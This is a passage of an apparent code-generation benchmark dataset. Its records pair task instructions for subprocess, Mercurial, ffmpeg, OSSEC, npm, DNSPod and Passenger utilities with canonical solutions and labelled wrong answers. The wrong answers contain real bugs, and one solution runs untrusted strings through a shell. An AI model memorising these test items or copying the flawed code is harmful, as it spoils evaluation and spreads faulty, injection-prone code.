    "Canonical_solution": "import sys\nimport subprocess\nimport threading\nimport shlex\ntry:\n    from Queue import Queue, Empty\nexcept:\n    from queue import Queue, Empty\n\nON_POSIX = 'posix' in sys.builtin_module_names\n\nclass ProcessRunner:\n    def __init__(self):\n        pass\n\n    def _read_output(self, pipe, q):\n        try:\n            for line in iter(lambda: pipe.read(1), b''):\n                q.put(line)\n        except ValueError:\n            pass\n        pipe.close()\n\n    def _stream_output(self, comm, shell=False):\n        output = error = \"\"\n        p = ot = et = None\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, \n                                bufsize=0, universal_newlines=True, close_fds=ON_POSIX)\n            \n            q = Queue()\n            t = threading.Thread(target=self._read_output, args=(p.stdout, q))\n            t.daemon = True\n            \n            qe = Queue()\n            te = threading.Thread(target=self._read_output, args=(p.stderr, qe))\n            te.daemon = True\n            \n            t.start()\n            te.start()\n\n            while True:\n                c = z = \"\"\n                try:\n                    c = q.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stdout.write(c)\n                    output += c\n                    sys.stdout.flush()\n                try:\n                    z = qe.get_nowait()\n                except Empty:\n                    pass\n                else:\n                    sys.stderr.write(z)\n                    error += z\n                    sys.stderr.flush()\n                p.poll()\n                if c==z==\"\" and p.returncode != None:\n                    break\n\n            o, e = p.communicate()\n            return (output+o, error+e, p.returncode)\n        except:\n            if p:\n                return (output, error, p.returncode)\n            return (\"\", \"Command not found!\", 1)\n\n    def _decode(self, value):\n        if sys.version_info >= (3,0) and isinstance(value, bytes):\n            return value.decode(\"utf-8\",\"ignore\")\n        return value\n\n    def _run_command(self, comm, shell=False):\n        try:\n            if shell and type(comm) is list:\n                comm = \" \".join(shlex.quote(x) for x in comm)\n            if not shell and type(comm) is str:\n                comm = shlex.split(comm)\n            p = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n            c = p.communicate()\n            return (self._decode(c[0]), self._decode(c[1]), p.returncode)\n        except:\n            return (\"\", \"Command not found!\", 1)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if type(command_list) is dict:\n            command_list = [command_list]\n        output_list = []\n        for comm in command_list:\n            args = comm.get(\"args\", [])\n            shell = comm.get(\"shell\", False)\n            stream = comm.get(\"stream\", False)\n            sudo = comm.get(\"sudo\", False)\n            \n            if not len(args):\n                continue\n                \n            if sudo:\n                out = self._run_command([\"which\", \"sudo\"])\n                if \"sudo\" in out[0]:\n                    if type(args) is list:\n                        args.insert(0, out[0].replace(\"\\n\", \"\"))\n                    elif type(args) is str:\n                        args = out[0].replace(\"\\n\", \"\") + \" \" + args\n\n            if stream:\n                out = self._stream_output(args, shell)\n            else:\n                out = self._run_command(args, shell)\n                \n            output_list.append(out)\n            if leave_on_fail and out[2] != 0:\n                break\n                \n        return output_list[0] if len(output_list) == 1 else output_list",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport threading\nimport queue\n\nclass ProcessRunner:\n    def __init__(self):\n        pass\n\n    def _read_output(self, pipe, q):\n        while True:\n            data = pipe.readline()\n            if not data:\n                break\n            q.put(self._decode(data))\n\n    def _decode(self, value):\n        if isinstance(value, bytes):\n            return value.decode('utf-8')\n        return value\n\n    def _stream_output(self, comm, shell):\n        proc = subprocess.Popen(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n        stdout_q = queue.Queue()\n        stderr_q = queue.Queue()\n\n        t_stdout = threading.Thread(target=self._read_output, args=(proc.stdout, stdout_q))\n        t_stderr = threading.Thread(target=self._read_output, args=(proc.stderr, stderr_q))\n        t_stdout.start()\n        t_stderr.start()\n\n        proc.wait()\n\n        stdout_data = []\n        while not stdout_q.empty():\n            stdout_data.append(stdout_q.get_nowait())\n        stderr_data = []\n        while not stderr_q.empty():\n            stderr_data.append(stderr_q.get_nowait())\n\n        stdout_str = ''.join(stdout_data)\n        stderr_str = ''.join(stderr_data)\n\n        return (stdout_str, stderr_str, proc.returncode)\n\n    def _run_command(self, comm, shell):\n        proc = subprocess.run(comm, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n        return (proc.stdout, proc.stderr, proc.returncode)\n\n    def execute(self, command_list, leave_on_fail=False):\n        if isinstance(command_list, dict):\n            commands = [command_list]\n        else:\n            commands = command_list\n\n        results = []\n        for cmd in commands:\n            args = cmd.get('args', [])\n            shell = cmd.get('shell', False)\n            stream = cmd.get('stream', False)\n            sudo = cmd.get('sudo', False)\n\n            if sudo:\n                args = ['sudo'] + args\n\n            if stream:\n                stdout, stderr, returncode = self._stream_output(args, shell)\n            else:\n                stdout, stderr, returncode = self._run_command(args, shell)\n\n            if returncode != 0:\n                if leave_on_fail:\n                    break\n                else:\n                    results.append((\"\", \"Command not found!\", 1))\n                    continue\n\n            results.append((stdout, stderr, returncode))\n\n        return results"
  },
  {
    "Task_id": 294,
    "Instruction": "Task Description: Implement a set of functions to interact with the Mercurial (hg) version control system to retrieve branch information and repository status using subprocess communication.\n\nFunction Description: The functions use Python's subprocess module to execute Mercurial commands and capture their output through pipes. The functions handle process creation, communication, and output parsing to provide repository information.\n\nInput: None (functions retrieve information directly from the Mercurial repository in the current working directory)\n\nOutput:\n\n_get_hg_branch() -> str - Returns the current Mercurial branch name as a string\n_get_hg_status(output: tuple) -> list - Returns a list of status lines from Mercurial output\nbuild_stats() -> tuple - Returns a tuple containing (status_list, branch_name) or (None, None) if an error occurs",
    "Canonical_solution": "import subprocess\nfrom ..utils import get_subprocess_env\n\ndef _get_hg_branch():\n    p = subprocess.Popen([\"hg\", \"branch\"],\n                         stdout=subprocess.PIPE,\n                         stderr=subprocess.PIPE,\n                         env=get_subprocess_env())\n    branch = p.communicate()[0].decode(\"utf-8\").rstrip('\\n')\n    return branch\n\ndef _get_hg_status(output):\n    return output[0].decode(\"utf-8\").splitlines()\n\ndef build_stats():\n    try:\n        p = subprocess.Popen([\"hg\", \"status\"],\n                             stdout=subprocess.PIPE,\n                             stderr=subprocess.PIPE,\n                             env=get_subprocess_env())\n    except OSError:\n        return None, None\n    pdata = p.communicate()\n    if p.returncode != 0:\n        return None, None\n    status = _get_hg_status(pdata)\n    branch = _get_hg_branch()\n    return status, branch",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef _get_hg_branch():\n    try:\n        result = subprocess.run(['hg', 'branch'], capture_output=True, text=True, check=True)\n        return result.stdout.strip()\n    except subprocess.CalledProcessError:\n        return None\n\ndef _get_hg_status(output):\n    lines = output[0].splitlines()\n    return lines\n\ndef build_stats():\n    branch = _get_hg_branch()\n    if branch is None:\n        return (None, None)\n    try:\n        result = subprocess.run(['hg', 'status'], capture_output=True, text=True, check=True)\n        status_lines = _get_hg_status((result.stdout, result.stderr))\n    except subprocess.CalledProcessError:\n        return (None, None)\n    return (status_lines, branch)"
  },
  {
    "Task_id": 295,
    "Instruction": "Task Description: Create a function that reads audio data from bytes using FFmpeg and converts it into a numpy array with specified sampling rate.\n\nFunction Description: The function `ffmpeg_read` takes raw audio bytes and converts them into a mono audio waveform with a specified sampling rate using FFmpeg. The audio is converted to 32-bit floating-point format. The function handles FFmpeg process creation, data piping, and conversion to numpy array.\n\nInput:\n- `bpayload`: bytes - Raw audio data to be processed\n- `sampling_rate`: int - Target sampling rate for the output audio\n\nOutput:\n- np.array - A numpy array containing the audio waveform in 32-bit floating-point format\n\nNote: The function raises `ValueError` if FFmpeg is not found or if the output audio is malformed.",
    "Canonical_solution": "import subprocess\nimport numpy as np\n\ndef ffmpeg_read(bpayload: bytes, sampling_rate: int) -> np.array:\n    \"\"\"\n    Helper function to read an audio file through ffmpeg.\n    \"\"\"\n    ar = f\"{sampling_rate}\"\n    ac = \"1\"\n    format_for_conversion = \"f32le\"\n    ffmpeg_command = [\n        \"ffmpeg\",\n        \"-i\",\n        \"pipe:0\",\n        \"-ac\",\n        ac,\n        \"-ar\",\n        ar,\n        \"-f\",\n        format_for_conversion,\n        \"-hide_banner\",\n        \"-loglevel\",\n        \"quiet\",\n        \"pipe:1\",\n    ]\n\n    try:\n        ffmpeg_process = subprocess.Popen(ffmpeg_command, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\n    except FileNotFoundError:\n        raise ValueError(\"ffmpeg was not found but is required to load audio files from filename\")\n    output_stream = ffmpeg_process.communicate(bpayload)\n    out_bytes = output_stream[0]\n\n    audio = np.frombuffer(out_bytes, np.float32)\n    if audio.shape[0] == 0:\n        raise ValueError(\"Malformed soundfile\")\n    return audio",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport numpy as np\n\ndef ffmpeg_read(bpayload, sampling_rate):\n    try:\n        subprocess.run(['ffmpeg', '--version'], check=True)\n    except:\n        raise ValueError(\"FFmpeg not found\")\n    process = subprocess.Popen(\n        ['ffmpeg', '-f', 's16le', '-ar', str(sampling_rate), '-ac', '1', '-i', '-'],\n        stdin=subprocess.PIPE,\n        stdout=subprocess.PIPE,\n        stderr=subprocess.PIPE\n    )\n    stdout, stderr = process.communicate(bpayload)\n    if stderr:\n        raise ValueError(\"FFmpeg output is malformed\")\n    samples = np.frombuffer(stdout, dtype=np.int16)\n    samples = samples.astype(np.float32) / 32768.0\n    return samples"
  },
  {
    "Task_id": 296,
    "Instruction": "Task Description: Create a function that executes a system command using Python's subprocess module with pipe-based inter-process communication.\n\nFunction Description: The function should take a system command as input, execute it in a subprocess, capture the output through a pipe, and return the decoded output string. It should handle the process creation, communication, and cleanup automatically.\n\nInput: \n- com: [str] - The system command to be executed as a string\n\nOutput:\n- [str] - The decoded output from the executed command, as a string",
    "Canonical_solution": "import sys\nimport subprocess\n\ndef excuteCommand(com):\n    ex = subprocess.Popen(com, stdout=subprocess.PIPE, shell=True)\n    out, err = ex.communicate()\n    status = ex.wait()\n    return out.decode()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\n\ndef execute_command(com):\n    result = subprocess.run(com, capture_output=True, text=True)\n    return result.stdout"
  },
  {
    "Task_id": 297,
    "Instruction": "Task Description: Create a function that executes a system command in a subprocess, captures its output and error streams, and handles potential errors appropriately.\n\nFunction Description: The function `run_cmd` executes a given system command as a subprocess, with options for verbose output. It captures both stdout and stderr streams, provides real-time output when in verbose mode, and raises an exception if the command fails (non-zero return code). The function ensures proper process cleanup and returns the command's output and error streams.\n\nInput:\n- command: List[str] - A list of strings representing the command and its arguments to be executed\n- verbose: bool (optional, default=False) - If True, prints real-time output of the command execution\n\nOutput:\n- Returns: Tuple[bytes, bytes] - A tuple containing the stdout and stderr output from the command\n- Raises: Exception - If the command returns a non-zero exit code, includes the return code and output streams in the exception message",
    "Canonical_solution": "import subprocess\nimport sys\n\ndef run_cmd(command, verbose=False):\n    if verbose:\n        print(\"Running command:\", \" \".join(command))\n    proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n\n    if verbose:\n        while proc.poll() is None:\n            string = b\"\"\n            for c in iter(lambda: proc.stdout.read(1), string):\n                c = c.decode(\"ascii\")\n                sys.stdout.write(c)\n\n        sys.stdout.flush()\n\n    proc.wait()\n    if proc.returncode != 0:\n        out, err = proc.communicate()\n        raise Exception(\n            \"The training could not be completed (returncode=%i): %s %s\"\n            % (proc.returncode, out, err)\n        )\n\n    out, err = proc.communicate()",
    "Code_level": "Function-level",
    "FSMID_for_test": 76,
    "wrong_result": "import subprocess\nimport sys\n\ndef run_cmd(command, verbose=False):\n    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=False)\n    stdout_bytes = b''\n    stderr_bytes = b''\n    while True:\n        if process.poll() is not None:\n            out = process.stdout.read()\n            stdout_bytes += out\n            err = process.stderr.read()\n            stderr_bytes += err\n            break\n        out = process.stdout.readline()\n        if out:\n            stdout_bytes += out\n            if verbose:\n                sys.stdout.write(out.decode('utf-8'))\n                sys.stdout.flush()\n        err = process.stderr.readline()\n        if err:\n            stderr_bytes += err\n            if verbose:\n                sys.stderr.write(err.decode('utf-8'))\n                sys.stderr.flush()\n    process.wait()\n    if process.returncode != 0:\n        raise Exception(f\"Command failed with code {process.returncode}\\nSTDOUT:\\n{stdout_bytes}\\nSTDERR:\\n{stderr_bytes}\")\n    return stdout_bytes, stderr_bytes"
  },
  {
    "Task_id": 298,
    "Instruction": "Task Description: Implement a class to collect and analyze OSSEC (Open Source Host-based Intrusion Detection System) agent states using subprocess communication.\n\nClass Description: The OssecCollector class interacts with the OSSEC agent control utility to retrieve agent status information and parse the results into a structured format. It handles command execution with optional sudo privileges and processes the output to count agent states.\n\nAttributes:\n- bin_path: [str] - Path to the OSSEC agent_control binary (default: '/var/ossec/bin/agent_control')\n- use_sudo: [bool] - Flag indicating whether to use sudo for command execution (default: True)\n- sudo_cmd: [str] - Path to the sudo binary (default: '/usr/bin/sudo')\n\nMethods:\n- __init__(bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None - Initializes the collector with configuration paths\n- collect() -> dict - Executes the agent control command, processes the output, and returns a dictionary counting agent states by status\n\nThe implementation should use subprocess.PIPE for inter-process communication and handle potential execution errors appropriately.",
    "Canonical_solution": "import subprocess\nimport re\nfrom diamond.collector import str_to_bool\n\nclass OssecCollector:\n    def __init__(self, bin_path='/var/ossec/bin/agent_control', use_sudo=True, sudo_cmd='/usr/bin/sudo'):\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self):\n        command = [self.bin_path, '-l']\n\n        if str_to_bool(self.use_sudo):\n            command.insert(0, self.sudo_cmd)\n\n        try:\n            p = subprocess.Popen(command, stdout=subprocess.PIPE)\n            res = p.communicate()[0]\n        except Exception as e:\n            raise Exception('Unable to exec cmd: %s, because %s' % (' '.join(command), str(e)))\n\n        if res == '':\n            raise Exception('Empty result from exec cmd: %s' % (' '.join(command)))\n\n        states = {}\n        for line in res.split(\"\\n\"):\n            if not line.startswith('   ID: '):\n                continue\n            fragments = line.split(',')\n            state = fragments[-1].lstrip()\n            if state not in states:\n                states[state] = 1\n            else:\n                states[state] += 1\n\n        return states",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "```python\nimport subprocess\n\nclass OssecCollector:\n    def __init__(self, bin_path: str = '/var/ossec/bin/agent_control', use_sudo: bool = True, sudo_cmd: str = '/usr/bin/sudo') -> None:\n        self.bin_path = bin_path\n        self.use_sudo = use_sudo\n        self.sudo_cmd = sudo_cmd\n\n    def collect(self) -> dict:\n        command = [self.sudo_cmd, self.bin_path] if self.use_sudo else [self.bin_path]\n        result = subprocess.run(command, capture_output=True, text=True, check=True)\n        counts = {}\n        for line in result.stdout.splitlines():\n            if line.startswith('Agent '):\n                parts = line.split(':', 1)\n                if len(parts) >= 2:\n                    status = parts[1].strip()\n                    counts[status] = counts.get(status, 0) + 1\n        return counts\n```"
  },
  {
    "Task_id": 299,
    "Instruction": "Task Description: Create a Python class that checks the installed version of npm (Node Package Manager) on the system using subprocess communication.\n\nClass Description: The Segment class is designed to retrieve and store the version of npm installed on the system. It uses subprocess.PIPE to communicate with the system process that runs the npm version command.\n\nAttributes:\nversion: [str] - Stores the version of npm retrieved from the system process. Initialized as None and updated after running the version check.\n\nMethods:\nrun: [run]() -> [None] - Executes the npm --version command using subprocess.Popen, captures the output, decodes it, and stores the result in the version attribute. Handles OSError exceptions if the command fails.\nget_version: [get_version]() -> [str] - Returns the stored npm version. Returns None if the version check was not successful or not run.",
    "Canonical_solution": "import subprocess\n\nclass Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        try:\n            p1 = subprocess.Popen([\"npm\", \"--version\"], stdout=subprocess.PIPE)\n            self.version = p1.communicate()[0].decode(\"utf-8\").rstrip()\n        except OSError:\n            self.version = None\n\n    def get_version(self):\n        return self.version",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
    "wrong_result": "class Segment:\n    def __init__(self):\n        self.version = None\n\n    def run(self):\n        try:\n            process = subprocess.Popen(['npm', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n            output, error = process.communicate()\n            if process.returncode == 0:\n                self.version = output.strip()\n            else:\n                self.version = None\n        except OSError as e:\n            self.version = None\n\n    def get_version(self):\n        return self.version"
  },
  {
    "Task_id": 30,
    "Instruction": "Task Description: Implement a Python class to interact with the DNSPod API for managing DNS records, including querying domain information, listing records, and updating DNS records.\n\nClass Description: DNSPodAPI is a class that provides methods to interact with DNSPod's API for DNS management. It handles authentication, request construction, and response processing for various DNS operations.\n\nAttributes:\n\nSITE: str - The DNSPod API endpoint (dnsapi.cn)\nMETHOD: str - Default HTTP method for requests (POST)\nTOKEN_PARAM: str - Parameter name for authentication token (login_token)\nDEFAULT: str - Default value for record line (\"\u9ed8\u8ba4\")\nLENGTH: str - Parameter name for response length (\"length\")\nID: str - DNSPod API token ID\nTOKEN: str - DNSPod API token key\nPROXY: str - Optional proxy server address\nTTL: int - Time-to-live value for DNS records\ndomain_list: dict - Cache of domain names and their IDs\nrecords: dict - Cache of DNS records organized by domain ID\nrecord_keys: tuple - Valid fields for DNS records\n\nMethods:\n\n__init__(token_id=None, token_key=None, proxy=None, ttl=None) -> None - Initializes the DNSPodAPI instance with authentication tokens and optional proxy/ttl settings.\n\nrequest(action, param=None, **params) -> dict - Makes an authenticated API request to the specified action with given parameters. Returns parsed JSON response or raises an exception on error.\n\nget_domain_info(domain) -> tuple - Splits a domain into its main and subdomain parts, returning the domain ID and subdomain.\n\nget_domain_id(domain) -> str - Retrieves and caches the ID for a given domain name.\n\nget_records(did, **conditions) -> dict - Retrieves DNS records for a domain ID that match given conditions (e.g., name, type).\n\nupdate_record(domain, value, record_type=\"A\") -> dict - Updates or creates a DNS record for the given domain with the specified value and record type.",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom json import loads as jsondecode\nfrom os import environ\n\nclass DNSPodAPI:\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.SITE = \"dnsapi.cn\"\n        self.METHOD = \"POST\"\n        self.TOKEN_PARAM = \"login_token\"\n        self.DEFAULT = \"\u9ed8\u8ba4\"\n        self.LENGTH = \"length\"\n        \n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n        self.domain_list = {}\n        self.records = {}\n        self.record_keys = (\"id\", \"name\", \"type\", \"line\", \"line_id\", \"enabled\", \"mx\", \"value\")\n\n    def request(self, action, param=None, **params):\n        if param:\n            params.update(param)\n        params = {k: v for k, v in params.items() if v is not None}\n        params.update({self.TOKEN_PARAM: \"%s,%s\" % (self.ID, self.TOKEN), 'format': 'json', self.LENGTH: \"3000\"})\n        \n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + action, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\",\n            \"User-Agent\": \"DDNS/%s (ddns@newfuture.cc)\" % environ.get(\"DDNS_VERSION\", \"1.0.0\")\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            raise Exception(res)\n        else:\n            data = jsondecode(res)\n            if not data:\n                raise Exception(\"empty response\")\n            elif data.get(\"status\", {}).get(\"code\") == \"1\":\n                return data\n            else:\n                raise Exception(data.get('status', {}))\n\n    def get_domain_info(self, domain):\n        domain_split = domain.split('.')\n        sub, did = None, None\n        main = domain_split.pop()\n        while domain_split:\n            main = domain_split.pop() + '.' + main\n            did = self.get_domain_id(main)\n            if did:\n                sub = \".\".join(domain_split) or '@'\n                break\n        return did, sub\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        else:\n            try:\n                info = self.request('Domain.Info', domain=domain)\n                did = info.get(\"domain\", {}).get(\"id\")\n                if did:\n                    self.domain_list[domain] = did\n                    return did\n            except Exception:\n                return None\n\n    def get_records(self, did, **conditions):\n        if did not in self.records:\n            self.records[did] = {}\n            data = self.request('Record.List', domain_id=did)\n            if data:\n                for record in data.get('records'):\n                    self.records[did][record[\"id\"]] = {\n                        k: v for (k, v) in record.items() if k in self.record_keys}\n\n        records = {}\n        for (rid, record) in self.records[did].items():\n            for (k, value) in conditions.items():\n                if record.get(k) != value:\n                    break\n            else:\n                records[rid] = record\n        return records\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        domainid, sub = self.get_domain_info(domain)\n        if not domainid:\n            raise Exception(\"invalid domain: [ %s ] \" % domain)\n\n        records = self.get_records(domainid, name=sub, type=record_type)\n        result = {}\n        if records:\n            for (did, record) in records.items():\n                if record[\"value\"] != value:\n                    res = self.request('Record.Modify', \n                                     record_id=did, \n                                     record_line=record[\"line\"].replace(\"Default\", \"default\").encode(\"utf-8\"), \n                                     value=value, \n                                     sub_domain=sub, \n                                     domain_id=domainid, \n                                     record_type=record_type, \n                                     ttl=self.TTL)\n                    if res:\n                        self.records[domainid][did][\"value\"] = value\n                        result[did] = res.get(\"record\")\n                    else:\n                        result[did] = \"update fail!\\n\" + str(res)\n                else:\n                    result[did] = domain\n        else:\n            res = self.request(\"Record.Create\", \n                             domain_id=domainid, \n                             value=value,\n                             sub_domain=sub, \n                             record_type=record_type, \n                             record_line=self.DEFAULT, \n                             ttl=self.TTL)\n            if res:\n                did = res.get(\"record\")[\"id\"]\n                self.records[domainid][did] = res.get(\"record\")\n                self.records[domainid][did].update(\n                    value=value, sub_domain=sub, record_type=record_type)\n                result = res.get(\"record\")\n            else:\n                result = domain + \" created fail!\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class DNSPodAPI:\n    SITE = 'dnsapi.cn'\n    METHOD = 'POST'\n    TOKEN_PARAM = 'login_token'\n    DEFAULT = '\u9ed8\u8ba4'\n    LENGTH = 'length'\n    ID = None\n    TOKEN = None\n    PROXY = None\n    TTL = None\n    domain_list = {}\n    records = {}\n    record_keys = ('id', 'name', 'type', 'value', 'ttl', 'disabled')\n\n    def __init__(self, token_id=None, token_key=None, proxy=None, ttl=None):\n        self.ID = token_id\n        self.TOKEN = token_key\n        self.PROXY = proxy\n        self.TTL = ttl\n\n    def request(self, action, param=None, **params):\n        params_dict = {'action': action}\n        if param is not None:\n            params_dict.update(param)\n        params_dict.update(params)\n        params_dict[self.TOKEN_PARAM] = self.TOKEN\n        url = self.SITE\n        headers = {}\n        proxies = {'http': self.PROXY, 'https': self.PROXY} if self.PROXY else None\n        response = requests.post(url, data=params_dict, proxies=proxies)\n        json_response = response.json()\n        if json_response.get('code') != 0:\n            raise Exception(json_response.get('message', 'Unknown error'))\n        return json_response.get('data', {})\n\n    def get_domain_info(self, domain):\n        domain_id = self.get_domain_id(domain)\n        parts = domain.split('.')\n        if len(parts) >= 2:\n            main_part = '.'.join(parts[-2:])\n            subdomain = '.'.join(parts[:-2])\n        else:\n            main_part = domain\n            subdomain = ''\n        return (domain_id, subdomain)\n\n    def get_domain_id(self, domain):\n        if domain in self.domain_list:\n            return self.domain_list[domain]\n        params = {'domain': domain}\n        response = self.request('Domain.Info', param=params)\n        domain_id = response.get('id')\n        self.domain_list[domain] = domain_id\n        return domain_id\n\n    def get_records(self, did, **conditions):\n        params = {'did': did}\n        params.update(conditions)\n        response = self.request('Record.List', param=params)\n        return response\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        did = self.get_domain_id(domain)\n        records = self.get_records(did, type=record_type)\n        for record in records:\n            if record['name'] == domain:\n                update_params = {\n                    'did': did,\n                    'name': domain,\n                    'type': record_type,\n                    'value': value,\n                    'ttl': self.TTL\n                }\n                response = self.request('Record.Update', param=update_params)\n                return response\n        create_params = {\n            'did': did,\n            'name': domain,\n            'type': record_type,\n            'value': value,\n            'ttl': self.TTL\n        }\n        response = self.request('Record.Create', param=create_params)\n        return response"
  },
  {
    "Task_id": 301,
    "Instruction": "Task Description: Implement a class to monitor and collect statistics about Passenger application server processes, including memory usage, CPU usage, and queue statistics.\n\nClass Description: The PassengerProcessCommunicator class is designed to interact with Passenger application server processes to gather various performance metrics. It uses subprocess communication to execute system commands and parse their outputs.\n\nAttributes:\n- config: [dict] - A configuration dictionary containing settings like command paths and sudo usage flags.\n\nMethods:\n- get_passenger_memory_stats() -> [dict] - Collects memory statistics for Apache, Nginx, and Passenger processes. Returns a dictionary with process lists and total memory usage.\n- get_passenger_cpu_usage(dict_stats: dict) -> [float] - Calculates total CPU usage percentage for all Passenger-related processes. Takes a dictionary of process stats and returns the total CPU usage.\n- get_passenger_queue_stats() -> [dict] - Gathers queue statistics from Passenger status, including top-level and application queue sizes. Returns a dictionary with queue metrics.",
    "Canonical_solution": "import subprocess\nimport re\nimport os\nfrom diamond.collector import str_to_bool\n\nclass PassengerProcessCommunicator:\n    def __init__(self, config):\n        self.config = config\n\n    def get_passenger_memory_stats(self):\n        command = [self.config[\"passenger_memory_stats_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        dict_stats = {\n            \"apache_procs\": [],\n            \"nginx_procs\": [],\n            \"passenger_procs\": [],\n            \"apache_mem_total\": 0.0,\n            \"nginx_mem_total\": 0.0,\n            \"passenger_mem_total\": 0.0,\n        }\n        \n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_digit = re.compile(\"^\\d\")\n        \n        apache_flag = 0\n        nginx_flag = 0\n        passenger_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"Apache processes\" in line:\n                apache_flag = 1\n            elif \"Nginx processes\" in line:\n                nginx_flag = 1\n            elif \"Passenger processes\" in line:\n                passenger_flag = 1\n            elif re_digit.match(line):\n                line_splitted = line.split()\n                if apache_flag == 1:\n                    dict_stats[\"apache_procs\"].append(line_splitted[0])\n                    dict_stats[\"apache_mem_total\"] += float(line_splitted[4])\n                elif nginx_flag == 1:\n                    dict_stats[\"nginx_procs\"].append(line_splitted[0])\n                    dict_stats[\"nginx_mem_total\"] += float(line_splitted[4])\n                elif passenger_flag == 1:\n                    dict_stats[\"passenger_procs\"].append(line_splitted[0])\n                    dict_stats[\"passenger_mem_total\"] += float(line_splitted[3])\n            elif \"Processes:\" in line:\n                passenger_flag = 0\n                apache_flag = 0\n                nginx_flag = 0\n\n        return dict_stats\n\n    def get_passenger_cpu_usage(self, dict_stats):\n        try:\n            proc1 = subprocess.Popen(\n                [\"top\", \"-b\", \"-n\", \"2\"],\n                stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return -1\n\n        re_lspaces = re.compile(\"^\\s*\")\n        re_digit = re.compile(\"^\\d\")\n        overall_cpu = 0\n        for raw_line in std_out.splitlines():\n            line = re_lspaces.sub(\"\", raw_line)\n            if not re_digit.match(line):\n                continue\n\n            line_splitted = line.split()\n            if line_splitted[0] in dict_stats[\"apache_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"nginx_procs\"]:\n                overall_cpu += float(line_splitted[8])\n            elif line_splitted[0] in dict_stats[\"passenger_procs\"]:\n                overall_cpu += float(line_splitted[8])\n\n        return overall_cpu\n\n    def get_passenger_queue_stats(self):\n        queue_stats = {\n            \"top_level_queue_size\": 0.0,\n            \"passenger_queue_size\": 0.0,\n        }\n\n        command = [self.config[\"passenger_status_bin\"]]\n        if str_to_bool(self.config[\"use_sudo\"]):\n            command.insert(0, self.config[\"sudo_cmd\"])\n\n        try:\n            proc1 = subprocess.Popen(command, stdout=subprocess.PIPE)\n            (std_out, std_err) = proc1.communicate()\n        except OSError:\n            return {}\n\n        if std_out is None:\n            return {}\n\n        re_colour = re.compile(\"\\x1B\\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]\")\n        re_requests = re.compile(r\"Requests\")\n        re_topqueue = re.compile(r\"^top-level\")\n\n        gen_info_flag = 0\n        app_groups_flag = 0\n        for raw_line in std_out.splitlines():\n            line = re_colour.sub(\"\", raw_line)\n            if \"General information\" in line:\n                gen_info_flag = 1\n            if \"Application groups\" in line:\n                app_groups_flag = 1\n            elif re_requests.match(line) and re_topqueue.search(line):\n                line_splitted = line.split()\n                if gen_info_flag == 1 and line_splitted:\n                    queue_stats[\"top_level_queue_size\"] = float(line_splitted[5])\n            elif re_requests.search(line) and not re_topqueue.search(line):\n                line_splitted = line.split()\n                if app_groups_flag == 1 and line_splitted:\n                    queue_stats[\"passenger_queue_size\"] = float(line_splitted[3])\n\n        return queue_stats",
    "Code_level": "Class-level",
    "FSMID_for_test": 76,
